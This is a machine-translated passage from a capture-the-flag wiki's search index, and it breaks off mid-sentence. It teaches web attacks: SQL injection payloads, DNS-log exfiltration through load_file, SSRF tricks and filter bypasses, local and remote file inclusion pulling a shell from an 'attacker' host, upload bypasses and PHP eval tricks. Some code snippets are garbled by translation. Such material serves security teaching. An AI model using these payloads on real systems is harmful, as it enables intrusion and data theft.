<p><code>admin'/*</code></p> </li> <li> <p><code>' or 1=1--</code></p> </li> <li> <p><code>' or 1=1#</code></p> </li> <li> <p><code>' or 1=1/*</code></p> </li> <li> <p><code>') or '1'='1--</code></p> </li> <li> <p><code>') or ('1'='1--</code></p> </li> <li> <p>Log in as different users <code>' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--</code></p> </li> </ul>"},{"location":"web/sqli/#injection-statement-memo","title":"Injection statement memo","text":""},{"location":"web/sqli/#data-storage-name","title":"data storage name","text":"<pre><code>SELECT database();\nSELECT schema_name FROM information_schema.schemata;\n</code></pre>"},{"location":"web/sqli/#table-name","title":"Table Name","text":"<ul> <li>union query</li> </ul> <pre><code>--version=9 for MySQL 4 and version=10 for MySQL 5\nUNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; /* Lists the tables in the current database*/\nUNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database(); /* Lists tables in all user-defined databases*/\n    SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';\n</code></pre> <ul> <li>blind</li> </ul> <pre><code>AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; 'A'\n</code></pre> <ul> <li>Error</li> </ul> <pre><code>AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));\n-- Successful in version 5.1.5.\n</code></pre>"},{"location":"web/sqli/#column-name","title":"Column name","text":"<ul> <li>union query</li> </ul> <pre><code>UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'\n</code></pre> <ul> <li>blind</li> </ul> <pre><code>AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; 'A'\n</code></pre> <ul> <li>Error</li> </ul> <pre><code>-- Successful in version 5.1.5\nAND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)\n-- MySQL 5.1 has been fixed\nAND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));\n</code></pre> <ul> <li>Use <code>PROCEDURE ANALYSIS ()</code></li> </ul> <pre><code>-- This requires a web display page with a field for the query you injected\n-- Get the first paragraph name\nSELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE()\n-- Get the second section name\n1 LIMIT 1.1 PROCEDURE ANALYSIS ()\n-- Get the third paragraph name\n1 LIMIT 2.1 PROCEDURE ANALYSIS ()\n</code></pre>"},{"location":"web/sqli/#query-the-table-based-on-the-column-name","title":"Query the table based on the column name","text":"<pre><code>-- Query the table whose name is username\nSELECT table_name FROM information_schema.columns WHERE column_name = 'username';\n-- Query the table containing the username in the field name\nSELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';\n</code></pre>"},{"location":"web/sqli/#bypassing-quotes","title":"Bypassing quotes","text":"<pre><code>-- hex encoding\nSELECT * FROM Users WHERE username = 0x61646D696E\n-- char() function\nSELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)\n</code></pre>"},{"location":"web/sqli/#bypassing-the-string-blacklist","title":"Bypassing the string blacklist","text":"<pre><code>SELECT 'a' 'd' 'mi' 'n';\nSELECT CONCAT('a', 'd', 'm', 'i', 'n');\nSELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');\nSELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');\n</code></pre> <p>When <code>CONCAT()</code> is used, any argument is null and will return null. It is recommended to use <code>CONCAT_WS()</code>. The first argument of the <code>CONCAT_WS()</code> function indicates which character interval is used to query the result.</p>"},{"location":"web/sqli/#conditional-statements","title":"Conditional statements","text":"<p><code>CASE</code>, <code>IF()</code>, <code>IFNULL()</code>, <code>NULLIF()</code>.</p> <pre><code>SELECT IF(1=1, true, false);\nSELECT CASE WHEN 1=1 THEN true ELSE false END;\n</code></pre>"},{"location":"web/sqli/#delay-function","title":"Delay function","text":"<p><code>SLEEP()</code>, <code>BENCHMARK()</code>.</p> <pre><code>' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '\n</code></pre>"},{"location":"web/sqli/#order-by-post-injection","title":"order by post injection","text":"<p><code>order by</code> Because it is a sort statement, you can use the conditional statement to make judgments, and judge the true and false conditions according to the returned sorting result. Variables with <code>order</code> or <code>order by</code> are probably the kind of injections. When you know a field, you can do the following:</p> <p>Original link: <code>http://www.test.com/list.php?order=vote</code></p> <p>Sort according to the <code>vote</code> field. Find the ticket with the highest number of votes <code>num</code> and construct the following link:</p> <pre><code>http://www.test.com/list.php?order=abs(vote-(length(user())&gt;0)*num)+asc\n</code></pre> <p>See if the sorting changes. There is another way to not know any field information, use the <code>rand</code> function:</p> <pre><code>http://www.test.com/list.php?order=rand(true)\nhttp://www.test.com/list.php?order=rand(false)\n</code></pre> <p>The above two will return different sorts, and the statement that determines whether the first character in the table name is less than 128 is as follows:</p> <pre><code>http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128))\n</code></pre>"},{"location":"web/sqli/#wide-byte-injection","title":"Wide byte injection","text":"<p>The most commonly used GBK code in the country, this way is mainly to bypass the transfer of special characters such as <code>addslashes</code>. The slash of backslash <code>\\</code> is <code>%5c</code>. When you type <code>%bf%27</code>, the function encounters the single quotes and automatically transfers to <code>\\</code>, which becomes <code>%bf%5c%. 27</code>,<code>%bf%5c</code> In GBK it becomes a wide character \"\u7f1e\". <code>%bf</code> The position can be any character in the middle of <code>%81-%fe</code>. Not only in SQL injection, wide character injection can be applied in many places.</p>"},{"location":"web/sqli/#dnslog-injection","title":"DNSLOG Injection","text":"<p>**DNS will leave a log when parsing, and obtain information by reading the parsing log of the multi-level domain name. Simply put, put the information in the advanced domain name, pass it to yourself, then read the log and get the information. **</p> <p>Dnslog platform: [http://ceye.io/] (http://ceye.io/)</p> <pre><code>mysql&gt; use security;\nDatabase changed\nmysql&gt; select load_file('\\\\\\\\test.xxx.ceye.io\\\\abc');\n+-------------------------------------------+\n| load_file('\\\\\\\\test.xxx.ceye.io\\\\abc') |\n+-------------------------------------------+\n| NULL                                      |\n+-------------------------------------------+\n1 row in set (22.05 sec)\nmysql&gt; select load_file(concat('\\\\\\\\',(select database()),'.xxx.ceye.io\\\\abc'));\n+----------------------------------------------------------------------+\n| load_file(concat('\\\\\\\\',(select database()),'.xxx.ceye.io\\\\abc')) |\n+----------------------------------------------------------------------+\n| NULL                                                                 |\n+----------------------------------------------------------------------+\n1 row in set (0.00 sec)\n</code></pre> <p></p>"},{"location":"web/sqli/#references","title":"References","text":"<ul> <li>SQL Injection Cheat Sheet</li> <li>MySQL Injection Tips</li> <li>MySQL Injection Science</li> <li>MySQL Injection Summary</li> <li>SQL Injection Attack and Defense</li> </ul>"},{"location":"web/ssrf/","title":"SSRF Server Request Forgery","text":""},{"location":"web/ssrf/#ssrf-introduction","title":"SSRF Introduction","text":"<p>SSRF, Server-Side Request Forgery, server request forgery, is a vulnerability that is constructed by an attacker to form a request initiated by the server. In general, the target of an SSRF attack is an internal system that is inaccessible from the external network.</p> <p>The reason for the vulnerability is mostly because the server provides the function of obtaining data from other server applications and does not filter and limit the target address.</p> <p>There are five main types of attacks that an attacker can make using SSRF:</p> <ol> <li>You can perform port scanning on the external network, the intranet where the server is located, and local, and obtain banner information for some services.</li> <li>Attack applications running on intranet or local (such as overflow)</li> <li>Fingerprint recognition of the intranet WEB application, by accessing the default file</li> <li>Attack web applications inside and outside the network, mainly attacks that can be implemented using GET parameters (such as Struts2, sqti, etc.)</li> <li>Use the <code>file</code> protocol to read local files, etc.</li> </ol>"},{"location":"web/ssrf/#ssrf-vulnerability-scenarios","title":"SSRF Vulnerability scenarios","text":"<ul> <li>Where there is a possibility to initiate a network request, there may be an SSRF vulnerability</li> <li>Request resources from a remote server (Upload from URL, Import &amp; Export RSS Feed)</li> <li>Database built-in functions (Oracle, MongoDB, MSSQL, Postgres, CouchDB)</li> <li>Webmail collects other emails (POP3, IMAP, SMTP)</li> <li>File processing, encoding processing, attribute information processing (ffmpeg, ImageMagic, DOCX, PDF, XML)</li> </ul>"},{"location":"web/ssrf/#common-backend-implementation","title":"Common backend implementation","text":"<ol> <li> <p><code>file_get_contents</code></p> <pre><code>&lt;?php\n\nif (isset($_POST['url'])) { \n\n    $content = file_get_contents($_POST['url']); \n\n    $filename ='./images/'.rand().';img1.jpg'; \n\n    file_put_contents($filename, $content); \n\n    echo $_POST['url']; \n\n    $img = \"&lt;img src=\\\"\".$filename.\"\\\"/&gt;\"; \n\n}\n\necho $img;\n\n?&gt;\n</code></pre> </li> </ol> <p>This code uses the <code>file_get_contents</code> function to get the image from the URL specified by the user. It is then saved to the hard disk with a random file name and presented to the user.</p> <ol> <li> <p><code>fsockopen()</code></p> <pre><code>&lt;?php \n\nfunction GetFile($host,$port,$link) { \n\n    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); \n\n    if (!$fp) { \n\n        echo \"$errstr (error number $errno) \\n\"; \n\n    } else { \n\n        $out = \"GET $link HTTP/1.1\\r\\n\"; \n\n        $out .= \"Host: $host\\r\\n\"; \n\n        $out .= \"Connection: Close\\r\\n\\r\\n\"; \n\n        $out .= \"\\r\\n\"; \n\n        fwrite($fp, $out); \n\n        $contents=''; \n\n        while (!feof($fp)) { \n\n            $contents.= fgets($fp, 1024); \n\n        } \n\n        fclose($fp); \n\n        return $contents; \n\n    } \n\n}\n\n?&gt;\n</code></pre> </li> </ol> <p>This code uses the <code>fsockopen</code> function to get the data (file or HTML) from the user's URL. This function uses a socket to establish a TCP connection with the server to transfer raw data.</p> <ol> <li> <p><code>curl_exec()</code></p> <pre><code>&lt;?php \n\nif (isset($_POST['url'])) {\n\n    $link = $_POST['url'];\n\n    $curlobj = curl_init();\n\n    curl_setopt($curlobj, CURLOPT_POST, 0);\n\n    curl_setopt($curlobj,CURLOPT_URL,$link);\n\n    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);\n\n    $result=curl_exec($curlobj);\n\n    curl_close($curlobj);\n\n\n\n    $filename = './curled/'.rand().'.txt';\n\n    file_put_contents($filename, $result); \n\n    echo $result;\n\n}\n\n?&gt;\n</code></pre> </li> </ol> <p>Use <code>curl</code> to get the data.</p>"},{"location":"web/ssrf/#scenarios-that-hinder-ssrf-exploits","title":"Scenarios that hinder SSRF exploits","text":"<ul> <li>Server open OpenSSL cannot be used interactively</li> <li>The server needs authentication (Cookies &amp; User: Pass) is not perfect</li> <li>The port that restricts requests is the commonly used port of http, for example, 80, 443, 8080, 8090.</li> <li>Disable unwanted protocols. Only http and https requests are allowed. Can prevent problems similar to file:///, gopher://, ftp://, etc.</li> <li>Unify the error message to prevent the user from judging the port status of the remote server based on the error message.</li> </ul>"},{"location":"web/ssrf/#port-scanning-with-ssrf","title":"Port scanning with SSRF","text":"<p>According to the return information of the server, most applications will not judge the port, and the status of the port can be judged by the returned banner information.</p> <p>Backend implementation</p> <pre><code>&lt;?php \n\nif (isset($_POST['url'])) {\n\n    $link = $_POST['url'];\n\n    $filename = './curled/'.rand().'txt';\n\n    $curlobj = curl_init($link);\n\n    $fp = fopen($filename,\"w\");\n\n    curl_setopt($curlobj, CURLOPT_FILE, $fp);\n\n    curl_setopt($curlobj, CURLOPT_HEADER, 0);\n\n    curl_exec($curlobj);\n\n    curl_close($curlobj);\n\n    fclose($fp);\n\n    $fp = fopen($filename,\"r\");\n\n    $result = fread($fp, filesize($filename)); \n\n    fclose($fp);\n\n    echo $result;\n\n}\n\n?&gt;\n</code></pre> <p>Construct a front page</p> <pre><code>&lt;html&gt;\n&lt;body&gt;\n\n  &lt;form name=\"px\" method=\"post\" action=\"http://127.0.0.1/ss.php\"&gt;\n\n    &lt;input type=\"text\" name=\"url\" value=\"\"&gt;\n\n    &lt;input type=\"submit\" name=\"commit\" value=\"submit\"&gt;\n\n  &lt;/form&gt;\n\n  &lt;script&gt;&lt;/script&gt;\n\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre> <p>Requesting a non-HTTP port can return banner information.</p> <p>Or you can use the 302 jump to bypass the limitations of the HTTP protocol.</p> <p>Auxiliary script</p> <pre><code>&lt;?php\n\n$ip = $_GET['ip'];\n\n$port = $_GET['port'];\n\n$scheme = $_GET['s'];\n\n$data = $_GET['data'];\n\nheader(\"Location: $scheme://$ip:$port/$data\");\n\n?&gt;\n</code></pre> <p>[Tencent SSRF vulnerability (very good use point) with script] (https://thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de.html)</p>"},{"location":"web/ssrf/#agreement-utilization","title":"Agreement Utilization","text":"<ul> <li> <p>Dict agreement</p> <pre><code>dict://fuzz.wuyun.org:8080/helo:dict\n</code></pre> </li> <li> <p>Gopher protocol</p> <pre><code>gopher://fuzz.wuyun.org:8080/gopher\n</code></pre> </li> <li> <p>File protocol</p> <pre><code>file:///etc/passwd\n</code></pre> </li> </ul>"},{"location":"web/ssrf/#bypass-posture","title":"Bypass posture","text":"<ol> <li> <p>Change the IP address For example <code>192.168.0.1</code></p> </li> <li> <p>octal format: <code>0300.0250.0.1</code></p> </li> <li>Hexadecimal format: <code>0xC0.0xA8.0.1</code></li> <li>10-digit integer format: <code>3232235521</code></li> <li>Hexadecimal integer format: <code>0xC0A80001</code></li> <li> <p>There is also a special omission mode, such as <code>10.0.0.1</code> which can be written as <code>10.1</code></p> </li> <li> <p>Use the URL to resolve the problem In some cases, the backend program may parse the accessed URL and filter the resolved host address. At this time, the URL parameters may be parsed improperly, which may bypass the filtering. E.g:</p> </li> <li><code>http://www.baidu.com@192.168.0.1/</code> and <code>http://192.168.0.1</code> are all requested for <code>192.168.0.1</code></li> <li>Can point to any ip domain name <code>xip.io</code>:<code>http://127.0.0.1.xip.io/</code>==&gt;<code>http://127.0.0.1/</code></li> <li>Short address <code>http://dwz.cn/11SMa</code>==&gt;<code>http://127.0.0.1</code></li> <li>Use the period <code>.</code>:<code>127.0.0.1</code>==&gt;<code>127.0.0.1</code><ul> <li> <p>\u5229\u7528Enclosed alphanumerics</p> <pre><code>\u24d4\u24e7\u24d0\u24dc\u24df\u24db\u24d4.\u24d2\u24de\u24dc  &gt;&gt;&gt;  example.com\n\nList:\n\n\u2460 \u2461 \u2462 \u2463 \u2464 \u2465 \u2466 \u2467 \u2468 \u2469 \u246a \u246b \u246c \u246d \u246e \u246f \u2470 \u2471 \u2472 \u2473 \n\n\u2474 \u2475 \u2476 \u2477 \u2478 \u2479 \u247a \u247b \u247c \u247d \u247e \u247f \u2480 \u2481 \u2482 \u2483 \u2484 \u2485 \u2486 \u2487 \n\n\u2488 \u2489 \u248a \u248b \u248c \u248d \u248e \u248f \u2490 \u2491 \u2492 \u2493 \u2494 \u2495 \u2496 \u2497 \u2498 \u2499 \u249a \u249b \n\n\u249c \u249d \u249e \u249f \u24a0 \u24a1 \u24a2 \u24a3 \u24a4 \u24a5 \u24a6 \u24a7 \u24a8 \u24a9 \u24aa \u24ab \u24ac \u24ad \u24ae \u24af \u24b0 \u24b1 \u24b2 \u24b3 \u24b4 \u24b5 \n\n\u24b6 \u24b7 \u24b8 \u24b9 \u24ba \u24bb \u24bc \u24bd \u24be \u24bf \u24c0 \u24c1 \u24c2 \u24c3 \u24c4 \u24c5 \u24c6 \u24c7 \u24c8 \u24c9 \u24ca \u24cb \u24cc \u24cd \u24ce \u24cf \n\n\u24d0 \u24d1 \u24d2 \u24d3 \u24d4 \u24d5 \u24d6 \u24d7 \u24d8 \u24d9 \u24da \u24db \u24dc \u24dd \u24de \u24df \u24e0 \u24e1 \u24e2 \u24e3 \u24e4 \u24e5 \u24e6 \u24e7 \u24e8 \u24e9 \n\n\u24ea \u24eb \u24ec \u24ed \u24ee \u24ef \u24f0 \u24f1 \u24f2 \u24f3 \u24f4 \n\n\u24f5 \u24f6 \u24f7 \u24f8 \u24f9 \u24fa \u24fb \u24fc \u24fd \u24fe \u24ff\n</code></pre> </li> </ul> </li> </ol>"},{"location":"web/ssrf/#hazard","title":"Hazard","text":"<ul> <li>You can scan the port on the external network, the intranet where the server is located, and the local port to obtain the banner information of some services.</li> <li>Attack applications running on intranet or local (such as overflow);</li> <li>Fingerprint recognition for intranet web applications, by accessing default files;</li> <li>Attacking internal and external web applications, mainly using get parameters to achieve attacks (such as struts2, sqti, etc.);</li> <li>Use the file protocol to read local files and so on.</li> </ul>"},{"location":"web/ssrf/#references","title":"References","text":"<ul> <li>[Build Your SSRF EXP Autowork] (http://tools.40huo.cn/#!papers.md)</li> <li>[Tencent SSRF vulnerability (very good use point) with script] (https://thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de.html)</li> <li>[Bilibili a substation leaked from information to ssrf to command execution] (https://_thorns.gitbooks.io/sec/content/bilibilimou_fen_zhan_cong_xin_xi_xie_lu_dao_ssrf_z.html)</li> </ul>"},{"location":"web/php/php/","title":"PHP Code Auditing","text":""},{"location":"web/php/php/#file-contains","title":"File contains","text":"<p>Common functions that cause files to be included are:</p> <ul> <li> <p>PHP\uff1a<code>include()</code>\uff0c<code>include_once()</code>\uff0c<code>require()</code>\uff0c<code>require_once()</code>\uff0c<code>fopen()</code>\uff0c<code>readfile()</code> \u7b49</p> </li> <li> <p>JSP Servlet \uff1a <code>ava.io.File ()</code> \uff0c <code>java.io.FileReader ()</code> \u7b49</p> </li> <li>ASP\uff1a<code>includefile</code>\uff0c<code>includevirtual</code> \u7b49</li> </ul> <p>When PHP includes a file, it will be executed as PHP code, regardless of the type of file.</p>"},{"location":"web/php/php/#local-file-contains","title":"Local file contains","text":"<p>The local file contains, Local File Inclusion, LFI.</p> <pre><code>&lt;?php\n\n$file = $_GET['file'];\n\nif (file_exists('/home/wwwrun/'.$file.'.php')) {\n\n  include '/home/wwwrun/'.$file.'.php';\n\n}\n\n?&gt;\n</code></pre> <p>The above code has a local file containing, and the contents of the <code>/etc/passwd</code> file can be read by truncating %00.</p> <ul> <li><code>%00</code> truncation</li> </ul> <pre><code>?file=../../../../../../../../../etc/passwd%00\n</code></pre> <p>Requires <code>magic_quotes_gpc=off</code>, PHP is less than 5.3.4.</p> <ul> <li>Path length truncation</li> </ul> <pre><code>?file=../../../../../../../../../etc/passwd/././././././.[\u2026]/./././././.\n</code></pre> <p>Linux requires a file name longer than 4096 and Windows needs to be longer than 256.</p> <ul> <li>Point number truncation</li> </ul> <p>```</p> <p>? file = ... / ... // ... // ... // ... / / boot.ini/ \u2026\u2026\u2026 [...] \u2026\u2026\u2026\u2026   ```</p> <p>For Windows only, the dot number needs to be longer than 256.</p>"},{"location":"web/php/php/#remote-file-contains","title":"Remote file contains","text":"<p>The remote file contains, Remote File Inclusion, RFI.</p> <pre><code>&lt;?php\n\nif ($route == \"share\") {\n\n  require_once $basePath . \"/action/m_share.php\";\n\n} elseif ($ route == &amp;quot;sharelink&amp;quot;) {\n  require_once $basePath . \"/action/m_sharelink.php\";\n\n}\n</code></pre> <p>Constructs the value of the variable <code>basePath</code>.</p> <pre><code>/?basePath=http://attacker/phpshell.txt?\n</code></pre> <p>The final code is executed</p> <pre><code>require_once \"http://attacker/phpshell.txt?/action/m_share.php\";\n</code></pre> <p>The part after the question mark is interpreted as the querystring of the URL, which is also a kind of \"truncation\".</p> <ul> <li>Normal remote file contains</li> </ul> <pre><code>?file=[http|https|ftp]://example.com/shell.txt\n</code></pre> <p>Need <code>allow_url_fopen=On</code> and <code>allow_url_include=On</code>.</p> <ul> <li>Utilize PHP stream input</li> </ul> <pre><code>?file=php://input\n</code></pre> <p>\u9700\u8981 <code>allow_url_include=On</code> \u3002</p> <ul> <li>Utilize PHP stream filter</li> </ul> <pre><code>?file=php://filter/convert.base64-encode/resource=index.php\n</code></pre> <p>\u9700\u8981 <code>allow_url_include=On</code> \u3002</p> <p>-Use data URIs</p> <pre><code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=\n</code></pre> <p>\u9700\u8981 <code>allow_url_include=On</code> \u3002</p> <ul> <li>Execute with XSS</li> </ul> <pre><code>?file=http://127.0.0.1/path/xss.php?xss=phpcode\n</code></pre> <p>Need <code>allow_url_fopen=On</code>, <code>allow_url_include=On</code> and the firewall or whitelist is not allowed to access the external network, first find an XSS vulnerability in the same site, including this page, you can inject malicious code.</p>"},{"location":"web/php/php/#file-upload","title":"File Upload","text":"<p>A file upload vulnerability is when a user uploads an executable script file and obtains the ability to execute server-side commands through this file. In most cases, file upload vulnerabilities generally refer to the problem of uploading a web script that can be parsed by the server, a so-called webshell issue. To complete this attack, several conditions are required. First, the uploaded file can be executed by the WEB container. Secondly, the user can access the file from the WEB. Finally, if the uploaded file is changed by security check, formatting, image compression, etc. Content may cause the attack to fail.</p>"},{"location":"web/php/php/#bypassing-the-upload-check","title":"Bypassing the upload check","text":"<ul> <li>Front end check extension</li> </ul> <p>Capture the package and bypass it.</p> <ul> <li><code>Content-Type</code> detection file type</li> </ul> <p>Capture the package to modify the <code>Content-Type</code> type to match the whitelist rules.</p> <ul> <li>Add a suffix to the server</li> </ul> <p>Try <code>%00</code> truncation.</p> <ul> <li>Server extension detection</li> </ul> <p>Exploit the vulnerability.</p> <ul> <li>Apache parsing</li> </ul> <p><code>phpshell.php.rar.rar.rar.rar</code> Because Apache does not know <code>.rar</code> this file type, so it will traverse the suffix to <code>.php</code>, and then think this is a PHP file.</p> <ul> <li>IIS parsing</li> </ul> <p>When the file name is <code>abc.asp;xx.jpg</code> under IIS 6, it will be parsed as <code>abc.asp</code>.</p> <ul> <li>PHP CGI path resolution</li> </ul> <p>When you visit <code>http://www.a.com/path/test.jpg/notexist.php</code>, <code>test.jpg</code> will be parsed as PHP, and <code>notexist.php</code> is a non-existent file. At this point, the configuration of Nginx is as follows</p> <pre><code>location ~ \\.php$ {\n\n  root html;\n\n  fastcgi_pass 127.0.0.1:9000;\n\n  fastcgi_index index.php;\n\n  fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;\n\n  include fastcgi_param;\n\n}\n</code></pre> <ul> <li>other methods</li> </ul> <p>The suffix case, double write, special suffix such as <code>php5</code>, etc., modify the content of the package to the WAF and so on.</p>"},{"location":"web/php/php/#variable-coverage","title":"Variable coverage","text":""},{"location":"web/php/php/#global-variable-override","title":"Global Variable Override","text":"<p>Variables that are not initialized and can be controlled by the user are likely to cause security problems.</p> <p><code>`</code>this register_globals = ON <pre><code>Example\n\n\n```php\n\n&lt;?php\n\necho &amp;quot;Register_globals:&amp;quot;. (int) ini_get (&amp;quot;register_globals&amp;quot;). &amp;quot; &lt;br/&gt; &amp;quot;;\n\n\nif ($auth) {\n\n  echo \"private!\";\n\n}\n\n?&gt;\n</code></pre></p> <p>When <code>register_globals=ON</code>, submit <code>test.php?auth=1</code>, the <code>auth</code> variable will be automatically assigned.</p>"},{"location":"web/php/php/#extract-variable-override","title":"<code>extract()</code> variable override","text":"<p>The <code>extract()</code> function can import variables from an array into the current symbol table, which is defined as</p> <pre><code>int extract ( array $var_array [, int $extract_type [, string $prefix ]] )\n</code></pre> <p>The second parameter specifies the behavior of the function when it is imported into the symbol table. The two most common values are <code>EXTR_OVERWRITE</code> and <code>EXTR_SKIP</code>.</p> <p>When the value is <code>EXTR_OVERWRITE</code>, in the process of importing variables into the symbol table, if the variable name conflicts, all variables are overwritten; the value of 'EXTR_SKIP<code>means skipping without overwriting. If the second parameter is not specified,</code>EXTR_OVERWRITE` is used by default.</p> <pre><code>&lt;?php\n\n$auth = \"0\";\n\nextract($_GET);\n\n\n\nif ($auth == 1) {\n\n  echo \"private!\";\n\n} else {\n\n  echo \"public!\";\n\n}\n\n?&gt;\n</code></pre> <p>Variable coverage can occur when the <code>extract()</code> function exports variables from an array that the user can control.</p>"},{"location":"web/php/php/#import_request_variables-variable-override","title":"<code>import_request_variables</code> Variable Override","text":"<pre><code>bool import_request_variables (string $types [, string $prefix])\n</code></pre> <p><code>import_request_variables</code> Imports variables from GET, POST, and Cookies into the global. Use this function to simply specify the type.</p> <pre><code>&lt;?php\n\n$auth = \"0\";\n\nimport_request_variables(\"G\");\n\n\n\nif ($auth == 1) {\n\n  echo \"private!\";\n\n} else {\n\n  echo \"public!\";\n\n}\n\n?&gt;\n</code></pre> <p><code>import_request_variables(&amp;quot;G&amp;quot;)</code> specifies the variables to be imported into the GET request, and submits the test coverage of <code>test.php?auth=1</code>.</p>"},{"location":"web/php/php/#parse_str-variable-override","title":"<code>parse_str()</code> variable override","text":"<pre><code>void parse_str ( string $str [, array &amp;$arr ])\n</code></pre> <p>The <code>parse_str()</code> function is usually used to parse the querystring in a URL, but when the parameter value can be controlled by the user, it is likely to cause variable coverage.</p> <pre><code>// var.php?var=new variable override\n$ var = &amp;quot;init&amp;quot;;\nparse_str($_SERVER[\"QUERY_STRING\"]);\n\nprint $ var;\n</code></pre> <p>Functions similar to <code>parse_str()</code> also have <code>mb_parse_str()</code>.</p>"},{"location":"web/php/php/#command-execution","title":"Command Execution","text":""},{"location":"web/php/php/#direct-execution-code","title":"Direct execution code","text":"<p>There are quite a few functions in PHP that can execute code directly.</p> <pre><code>eval();\n\nassert();\n\nsystem();\n\nexec();\n\nshell_exec();\n\npassthru();\n\nescapeshellcmd();\n\npcntl_exec();\n\n......\n</code></pre>"},{"location":"web/php/php/#preg_replace-code-execution","title":"<code>preg_replace()</code> Code Execution","text":"<p>The first argument to <code>preg_replace()</code> allows code execution if the <code>/e</code> mode modifier is present.</p> <pre><code>&lt;?php\n\n$ var = &amp;quot; &lt;tag&gt; phpinfo () &lt;/tag&gt; &amp;quot;;\npreg_replace ( &amp;quot;/ &lt;tag&gt; (. *?) &amp;lt;/ tag&amp;gt; / e &amp;quot;,&amp;quot; addslashes (1) &amp;quot;, $ var);\n?&gt;\n</code></pre> <p>If you don't have the <code>/e</code> modifier, you can try %00 truncation.</p>"},{"location":"web/php/php/#preg_match-code-execution","title":"<code>preg_match</code> Code Execution","text":"<p><code>preg_match</code> performs a matching regular expression, allowing the code to execute if the match is successful.</p> <pre><code>&lt;?php\n\ninclude 'flag.php';\n\nif(isset($_GET['code'])){\n\n    $code = $_GET['code'];\n\n    if(strlen($code)&gt;40){\n\n        die(\"Long.\");\n\n    }\n\n    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n\n        die(\"NO.\");\n\n    }\n\n    @eval($code);\n\n}else{\n\n    highlight_file(__FILE__);\n\n}\n\n//$hint =  \"php function getFlag() to get flag\";\n\n?&gt;\n</code></pre> <p>This question is a question from the plum wine master when the <code>xman</code> training session. This series of code descriptions is like this. We want to bypass the passing of regular numbers and alphabetic strings such as <code>AZ</code>, <code>az</code>, <code>0-9</code>, and convert non-alphanumeric characters into various transformations. Can construct any character in <code>az</code>, and the string length is less than <code>40</code>. Then use <code>PHP</code> to allow dynamic function execution features, stitch out a function name, here we are <code>getFlag</code>, and then dynamically execute the code.</p> <p>So, the question we need to consider is how to pass various transformations so that we can successfully read the <code>getFlag</code> function and get the <code>webshell</code>.</p> <p>Before we understand this, we first need to understand the concept of XOR <code>^</code> in <code>PHP</code>.</p> <p>Let's take a look at the following code:</p> <pre><code>&lt;?php\n\necho &amp;quot;A&amp;quot; ^ &amp;quot;?&amp;quot;;\n?&gt;\n</code></pre> <p>The results are as follows:</p> <p></p> <p>We can see that the output is the character <code>~</code>. The reason for this is because the code <code>A</code> and the character <code>?</code> are XORed in the code. In <code>PHP</code>, when two variables are XORed, the string is first converted to an <code>ASCII</code> value, then the <code>ASCII</code> value is converted to binary and then XORed, XOR is completed, and the result is converted from binary. Become an <code>ASCII</code> value and convert the <code>ASCII</code> value to a string. XOR operations are also sometimes used to exchange the values of two variables.</p> <p>Like the example above</p> <p>The <code>ASCII</code> value of <code>A</code> is <code>65</code> and the corresponding binary value is <code>01000001</code>.</p> <p>The ASCII value of <code>?</code> is <code>63</code> and the corresponding binary value is <code>00111111</code>.</p> <p>The value of the exclusive OR binary is <code>\u202d01111110\u202c</code>, the corresponding <code>ASCII</code> value is <code>126</code>, and the corresponding string value is <code>~</code>.</p> <p>We all know that <code>PHP</code> is a weakly typed language, that is, in <code>PHP</code> we can declare a variable directly and initialize or assign it without declaring the type of the variable. It is precisely because of the <code>PHP</code> weak type that we implicitly convert the variable type of <code>PHP</code> and use this feature to perform some unconventional operations. If you convert an integer to a string, treat a boolean as an integer, or treat a string as a function, let's look at a piece of code:</p> <pre><code>&lt;?php\n\n    function B(){\n\n        echo \"Hello Angel_Kitty\";\n\n    }\n\n    $_++;\n\n    $__= \"?\" ^ \"}\";\n\n    $__();\n\n?&gt;\n</code></pre> <p>The code execution results are as follows:</p> <p></p> <p>Let's analyze the above code together:</p> <p>1, <code>$_++;</code> This line of code means to increment the variable named <code>&amp;quot;_&amp;quot;</code>, the default value of the variable undefined in <code>PHP</code> <code>null</code>, <code>null== False==0</code>, we can get a number by auto-incrementing the undefined variable without using any numbers.</p> <p>2, <code>$__=&amp;quot;?&amp;quot; ^ &amp;quot;}&amp;quot;;</code> XOR the characters <code>?</code> and <code>}</code>, 